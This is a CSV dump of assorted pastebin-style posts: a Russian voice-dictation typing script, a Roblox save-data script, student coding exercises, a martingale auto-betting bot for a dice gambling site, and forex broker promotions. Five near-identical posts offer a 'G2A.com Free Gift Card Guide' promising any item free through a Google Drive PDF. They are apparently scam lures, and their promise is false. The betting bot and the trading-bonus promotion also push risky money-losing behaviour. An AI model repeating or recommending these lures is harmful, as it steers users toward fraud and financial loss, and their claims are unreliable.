id,title,username,language,date,content
from pynput import *
class save_key:
  def __init__(self):
    self.text = """"
    self.flag = False
    self.word=[]
    self.res={}
    self.new_res={}
  def save_text(self, text):
    self.text = text
  def get_text(self):
    return self.text
  def get_flag(self):
    return self.flag

  def set_flag(self, value):
    self.flag = value

  def update_dict(self):
   data = ""/mnt/807EB5FA7EB5E954/софт/виртуальная машина/linux must have/python_linux/Project/list for replacements.json""  # файл настроек.
   if os.path.exists(data):  # есть ли этот файл.
    with open(data, encoding=""cp1251"") as json_file:  # загрузка настроек из файла.
     self.res = json.load(json_file)     # проходимся по каждому элементу словаря
     for key in self.res.keys():    # Если ключ содержит '*', добавляем его в новый словарь
      if '*' in key:
       self.new_res[key] = self.res[key]
     for key in self.new_res.keys():
      del self.res[key]

  def get_dict(self):# словарь без *
     return self.res

  def get_new_dict(self):# словарь с *
     return self.new_res

  def save_words(self, w):
     self.word.clear()
     for i in w:
      self.word.append(i)

  def get_words(self):
     return self.word
k=save_key()
k.update_dict()
def replace(match):
  res=k.get_dict()
  return res[match.group(0)]
class save_ln:
  def __init__(self):
    self.text = """"
  def save_text(self, text):
    self.text = text
  def get_text(self):
      return self.text
def typing_text(char1):#  delay = 0.0001  # Задайте здесь нужную задержку в секундах
  for char in char1:
    script = f'''#!/bin/bash
    word=""{char}""  # Задайте здесь нужное слово  # Задайте здесь нужную задержку в секундах
    if [[ -z ""$word"" ]]; then
      xte ""key space""
    else
    xdotool type  ""$word""
    fi
    '''
    subprocess.call(['bash', '-c', script, '_'])

def repeat(text, k):
  k.save_text(text)
  text1=""""
  res=k.get_dict()
  k.save_words(res)
  words=k.get_words()
  for i in words:
     text = k.get_text()
     reg = r'\b' + r'\b|\b'.join([i]) + r'\b'
     text1 = re.sub(reg, replace, text)
     k.save_text(text1)
  new_res= k.get_new_dict()
  for word, i in new_res.items():
      text = k.get_text()
      pattern = re.compile(re.escape(word), re.IGNORECASE)
      text1 = pattern.sub(i, text)
      k.save_text(text1)
  return text1

# Подавление вывода ошибок
class NoALSAErrorOutput:
  def __enter__(self):
    self._stderr = sys.stderr
    sys.stderr = open(os.devnull, 'w')

  def __exit__(self, exc_type, exc_val, exc_tb):
    sys.stderr.close()
    sys.stderr = self._stderr


with NoALSAErrorOutput():
  mic = sr.Microphone()

# Создаем экземпляр класса распознавания
r = sr.Recognizer()

# Настройки микрофона
mic = sr.Microphone()

# Начальная настройка микрофона для снижения уровня шума
with mic as source:
  r.adjust_for_ambient_noise(source)
def on_press(key):  # обработчик клави. # print(key )
 key=str(key).replace("" "","""")
 if key == ""Key.shift_r"":
   # print(""okl"")
   k.set_flag(True)
   return True
 if key == ""Key.space"":
   k.set_flag(False)
   return True
 else:
  return True
def on_release(key):
 pass
 return True
def a():
  while 1:
    with keyboard.Listener(on_release=on_release, on_press=on_press) as listener:
      listener.join()

def apply_pulseaudio_equalizer():
  # Применение эквалайзера с использованием PulseAudio
  subprocess.run(['pactl', 'load-module', 'module-equalizer-sink', 'sink_name=equalizer'])
  subprocess.run(
    ['pactl', 'load-module', 'module-ladspa-sink', 'sink_name=ladspa_equalizer', 'sink_properties=device.description=Equalized_Sink', 'master=equalizer', 'plugin=mbeq_1197',
     'label=mbeq', 'control=6.0,6.0,4.5,0.0,0.0,0.0,0.0,0.0,4.5,7.0,8.5,10.0,12.0,8.5,6.0'])


# Подавление вывода ошибок ALSA
class NoALSAErrorOutput:
    def __enter__(self):
        self._stderr = sys.stderr
        sys.stderr = open(os.devnull, 'w')

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stderr.close()
        sys.stderr = self._stderr

def get_mic_sources_pa():# Получение списка источников ввода
    result = subprocess.run(['pactl', 'list', 'sources', 'short'], stdout=subprocess.PIPE)
    return result.stdout.decode()

def set_mic_volume_pa(source_name, volume_percentage):# Установить уровень громкости микрофона через PulseAudio
    subprocess.run(['pactl', 'set-source-volume', source_name, f'{volume_percentage}%'])

mic_sources = get_mic_sources_pa()# Получение информации о устройствах ввода с помощью PulseAudio
# Переключитесь для вашего источника
source_name = ""alsa_input.usb-046d_HD_Webcam_C525_79588C20-00.mono-fallback""
volume_level = 50  # Процент громкости
set_mic_volume_pa(source_name, volume_level)# Установка уровня громкости микрофона

def recognize_speech():
  with mic as source:
    while 1:
      try:
        print(""Скажите что-нибудь..."")
        audio = r.listen(source)          # Обработка аудио данных или передача в распознаватель речи
        text = r.recognize_google(audio, language=""ru-RU"")# Распознаем услышанное при помощи Google Web Speech API
        text = str(text.lower()) + str("" "")
        print(text)
        if k.get_flag() == True:
          k.set_flag(False)
          text0 = text[0].upper() + text[1:]
          typing_text(text0)  #(text0)
        else:
          typing_text(text)  #(text)
      except sr.UnknownValueError:
        print(""Google Web Speech API не смог распознать аудио"")
      except sr.RequestError as e:
        print(f""Could not request results from Google Web Speech API; {e}"")

# Запуск потока для непрерывного прослушивания
apply_pulseaudio_equalizer()
listening_thread = threading.Thread(target=recognize_speech)
listening_thread.start()
t1 = threading.Thread(target=a)
t1.start()
while True:
  pass
"
67f9hpAB,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,dustinction,JavaScript,Sunday 2nd of June 2024 02:58:08 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
WbCwRKxJ,so totally snowy,coinwalk,JavaScript,Sunday 2nd of June 2024 02:36:13 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var belance = 0;
var greatie = elderly;
var prefit = 0.00001;
var beast = prefit;
var winnerdinner = elderly;
var wednesday = 0;
var stroke = 0;
var broke = 0;
var elven = elderly;
 
function go(){
if (greatie!=belance){
belance = document.getElementById('pct_balance').value;
if (belance>elven){
    stroke = stroke+1;
    broke  = 0;
    wednesday = wednesday+1 ;
    elven = parseFloat(belance);
}
if (belance<elven) {
    stroke = 0;
    broke = broke+1;
    elven = parseFloat(belance);
}
if (stroke==2) {
    beast = beast*2
}
if (stroke==3) {
    beast = beast*2
}
if (stroke==4) {
    beast = prefit;
    wednesday = 0;
    stroke  = 0;
}
if ((wednesday>1)&&(broke==1)) {
    beast = prefit;
    wednesday = 0;
} 
if ((wednesday<2)&&(broke>=2)) {
    beast = prefit;
    wednesday = 0;
} 
if (belance>=14400)  {
    console.log(""winner winner chicken dinner"");
    return;
} 
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
setTimeout(() => go(), 1);
greatie = document.getElementById('pct_balance').value;
}

go();"
8d98Qg56,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,sayid83,JavaScript,Sunday 2nd of June 2024 02:33:06 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
J08KLUQS,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,PetrikDev,JavaScript,Sunday 2nd of June 2024 02:08:05 PM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
5pUGRBFr,Use This,qsenko1,Lua,Sunday 2nd of June 2024 02:03:24 PM CDT,"local Players = game:GetService(""Players"")
local DataStoreService = game:GetService(""DataStoreService"")
local EffectsDatastore = DataStoreService:GetDataStore(""EffectsDatastore"")

game.Players.PlayerAdded:Connect(function(Player)	
	local EffectsFolder = Instance.new(""Folder"",Player)
	EffectsFolder.Name = ""EffectsFolder""
	local EquippedDeathSounds = Instance.new(""StringValue"",Player)
	EquippedDeathSounds.Name = ""EquippedDeathSounds""
	-- Bool
	local EffectsBool = Instance.new(""BoolValue"",EffectsFolder)
	EffectsBool.Name = ""EffectsBool""
	-- Hand Trails
	local White_Trail = Instance.new(""BoolValue"",EffectsFolder)
	White_Trail.Name = ""White Trail""

	local userId = Player.UserId
	local key = ""Player_""..userId

	local success, returnValue 
	success, returnValue = pcall(EffectsDatastore.GetAsync, EffectsDatastore, key)

	if success then
		if returnValue == nil then
			returnValue = {
				White_Trail = false,
				EquippedDeathSounds = """"
			}			
		end
		-- Safety Bool
		EffectsBool.Value = true
		-- Trails
		White_Trail.Value = if returnValue.White_Trail ~= nil then returnValue.White_Trail else false
		-- Equppables
		EquippedDeathSounds.Value = if returnValue.EquippedDeathSounds ~= nil then returnValue.EquippedDeathSounds else """"
	else
		Player:Kick(""There was an error with loading your Data! Roblox's Datastore might be down,try agen later or contact us trough our Group!"")
		print(Player.Name.. "" Has a Data loading ERROR!!"")
	end

end)

game.Players.PlayerRemoving:Connect(function(Player)
	if Player.EffectsFolder:FindFirstChild(""EffectsBool"").Value == true then
		local userId = Player.UserId
		local key = ""Player_""..userId
		-- Main Values
		local equippeddeathsounds = Player.EquippedDeathSounds.Value
		-- Hand Trails
		local white_trail = Player.EffectsFolder[""White Trail""].Value

		local DataTable = {
			EquippedDeathSounds = equippeddeathsounds,
			White_Trail = white_trail,
		}

		print(DataTable)

		local success,returnValue
		success,returnValue = pcall(EffectsDatastore.UpdateAsync, EffectsDatastore, key, function()
			return DataTable
		end)

		if success  then
			print(""Effects Data Saved!"")
		else
			print(""Data Saving ERROR!!"")
		end

	end
end)"
VxTJDLCu,How Can I Maximize My Profits with the Trex Globals Credit Bonus,reviewbrokers,PHP,Sunday 2nd of June 2024 01:59:54 PM CDT,"https://www.reviewbrokers.net/how-can-i-maximize-my-profits-with-the-trex-globals-credit-bonus/
 Table of Contents: Trex Globals
1. Understanding the Trex Globals Credit Bonus
2. How to Claim Your Credit Bonus
3. Exploring Trading Opportunities with the Credit Bonus
4. Important Considerations
5. Terms and Conditions
6. Conclusion
Understanding the Trex Globals Credit Bonus
The Trex Globals Credit Bonus is a straightforward yet powerful offer that grants you a 50% credit bonus on top of your deposit amount. Imagine depositing $100 and receiving an additional $50 bonus, instantly boosting your account balance to $150. This extra credit serves as a catalyst for expanding your trading volume and potentially increasing your profits.
How to Claim Your Credit Bonus

 	
Register a new account:
Begin your trading journey with Trex Globals by signing up for a new account. The registration process is quick and seamless, ensuring you can start trading in no time.
 	
Complete the verification:
Prioritize the security of your account by completing the verification process. This step ensures the safety of your funds and provides peace of mind as you engage in trading activities.
 	
Receive the Credit Bonus 50%:
Once your account is verified, the 50% credit bonus will be automatically credited to your account. There's no waiting period—your bonus is ready to be utilized immediately.

Exploring Trading Opportunities with the Credit Bonus
The versatility of the bonus extends across various financial instruments, including forex, commodities, indices, and cryptocurrencies. Whether you're interested in currency pairs, precious metals, or digital assets, the credit bonus empowers you to explore diverse trading opportunities and implement various strategies.
Important Considerations

 	
Limited time offer:
The Trex Globals Credit Bonus is available for a limited time, adding a sense of urgency to this enticing offer.
 	
Withdrawal conditions:
The bonus can be withdrawn only upon generating profits. In the event of losses, the bonus amount will be deducted from your account balance, incentivizing responsible trading practices.

Terms and Conditions
It's crucial to familiarize yourself with the terms and conditions associated with the credit bonus:

 	
General terms and conditions:
The bonus is subject to the overarching terms and conditions of Trex Globals, ensuring fairness and transparency.
 	
Trex Globals' prerogative:
Trex Globals reserves the right to modify or terminate the promotion at its discretion, emphasizing the importance of staying informed.

Conclusion
The Trex Globals Credit Bonus presents a compelling opportunity to enhance your trading journey. By augmenting your initial investment with a 50% credit bonus, Trex Globals enables you to expand your trading horizons and pursue greater profits. However, it's essential to approach this bonus with a clear understanding of its terms and conditions, ensuring a positive and rewarding trading experience.

Don't miss out on the chance to elevate your trading experience with the Trex Globals Credit Bonus. Sign up today and seize the benefits while they last!"
FcGGJziv,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,x3kiN,JavaScript,Sunday 2nd of June 2024 01:43:03 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
cxP97c8A,How to Participate in the Sniper Weekly Demo Contest – InstaForex,fxvnpro,PHP,Sunday 2nd of June 2024 01:38:36 PM CDT,"https://www.fxvnpro.com/how-to-participate-in-the-sniper-weekly-demo-contest-instaforex/
 How to Participate in the Sniper Weekly Demo Contest – InstaForex
The Sniper Weekly Demo Contest is a prestigious competition hosted by InstaForex, designed to test and reward the best trading strategies and skills. Participants have the chance to win cash prizes while showcasing their trading prowess. Here are the essential details:
Table of Contents : InstaForex

 	Contest Overview
 	Eligibility Criteria
 	Trading Conditions
 	Determining Results and Winners
 	Additional Information

Contest Overview

 	Contest Name: Sniper Weekly Demo Contest
 	Organizer: InstaForex
 	Duration: Held every week from Monday 00:00 to Friday 23:59:59 (terminal time)
 	Prize Pool: $2,000
 	Prize Distribution:

 	1st place: $700
 	2nd place: $500
 	3rd place: $400
 	4th place: $300
 	5th place: $100


 	Registration: Participants must register on the InstaForex website and open individual demo accounts for each weekly contest. Registration ends one hour before the contest starts.

Eligibility Criteria

 	Participation: Any owner of a trading account with InstaForex can participate in the contest.
 	Age Requirement: Only full-aged customers (over 18 years old) are eligible.
 	Registration Details: Participants must sign up on the InstaForex website and provide true data, including their full name and available email address.

Trading Conditions

 	Initial Deposit: $10,000 for all participants.
 	Leverage: 1:500 by default.
 	Trading Instruments: Major currency pairs and cross rates are the only available trading instruments.
 	Trade Volume: Minimal trade volume is 0.01 lot, and the maximum is 1 lot.
 	Stop-out Level: 10%.
 	Expert Advisors: Participants can use Expert Advisors and any trading strategies without restrictions.

Determining Results and Winners

 	Results Access: Equity of participants' accounts is available in free access on the company's website during the contest period.
 	Winner Selection: The winners are determined based on the equity of their accounts at the end of the contest period.
 	Prize Claims: Winners are required to open and verify their live trading accounts to receive their prizes.

Additional Information

 	Future Registration: Participants can register for the next weekly contest during the week preceding it. Registration finishes one hour before the contest starts.
 	Disqualification Rights: The Organizer reserves the right to decline registration of any participant without explanation or disqualify any participant during the contest or after it is over with an explanation.

By following these rules and guidelines, participants can effectively take part in the Sniper Weekly Demo Contest and stand a chance to win cash prizes. This contest offers a fantastic opportunity for traders to refine their skills and gain recognition in the trading community.

Read InstaForex Review"
CECQcz2r,zad 2,Nihonik,Python,Sunday 2nd of June 2024 01:33:36 PM CDT,"x = int(input(""podaj liczbe: ""))


while True:
    if (x >= 0):
        x = int(input(""podaj ujemną liczbe: ""))
    else:
        print(""ok"")
        break"
ss7hdbTF,Untitled,yasi04,Python,Sunday 2nd of June 2024 01:32:03 PM CDT,"def remove_none(data):
    new_data = []
    for i in range(len(data)):
        if data[i][0] is not None:
            new_data.append(data[i])
    return new_data


def remove_doubles_rows(data):
    new_data = []
    for i in data:
        new_data.append(i)
    for i in range(len(data) - 1):
        for j in range(i + 1, len(data)):
            if data[i] == data[j]:
                del new_data[j]
    return new_data


def remove_doubles_columns(data):
    for i in range(len(data)):
        data[i] = sorted(list(frozenset(data[i])))
    return data


def transport(data):
    for i in range(len(data)):
        data[i] = transport2(data[i])
    return data


def transport2(data):
    data[0] = ""("" + data[0].split(' ')[1] + "") "" + data[0].split(' ')[2]
    data[1] = f""{float(data[1]):.4f}""
    data[2] = data[2].split('[')[0]
    data[3] = data[3].split(' ')[0]
    return data


def transform(data):
    new_data = [[] for _ in range(len(data[0]))]
    for i in range(len(new_data)):
        for j in range(len(data)):
            new_data[i].append(data[j][i])
    new_data[0], new_data[1], new_data[2], new_data[3] = new_data[2], new_data[1], new_data[0], new_data[3]
    return new_data


def main(data):
    data = remove_none(data)
    data = remove_doubles_rows(data)
    data = remove_doubles_columns(data)
    data = transport(data)
    data = transform(data)
    return data
"
ZHXSbz10,Untitled,Josif_tepe,C++,Sunday 2nd of June 2024 01:29:12 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;

int main()
{
  vector<pair<int, int>> v;

  int n;
  cin >> n;
  for(int i = 0; i < n; i++) {
    int a, b;
    cin >> a >> b;
    v.push_back(make_pair(b, a));
  }

  sort(v.begin(), v.end());
    int res = 1;
    int vreme = v[0].first;
    for(int i = 1; i < n; i++) {
        if(vreme <= v[i].second) {
            res++;
            vreme = v[i].first;
        }
    }
    cout << res << endl;


    return 0;
}
"
uR220kR1,zad 1,Nihonik,Python,Sunday 2nd of June 2024 01:27:31 PM CDT,"x = input(""podaj liczby odzielone spacją: "")

y= x.split("" "")

z = 0

for i in y:
	a = int(i)
	if a % 10 == 0:
		z +=1
print(""ilość podanych liczb"" + len(x))
print(""ilość liczb podzielnych przez 10"" + z)"
H5Qz1Lde,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,FeasModz514,JavaScript,Sunday 2nd of June 2024 01:18:01 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
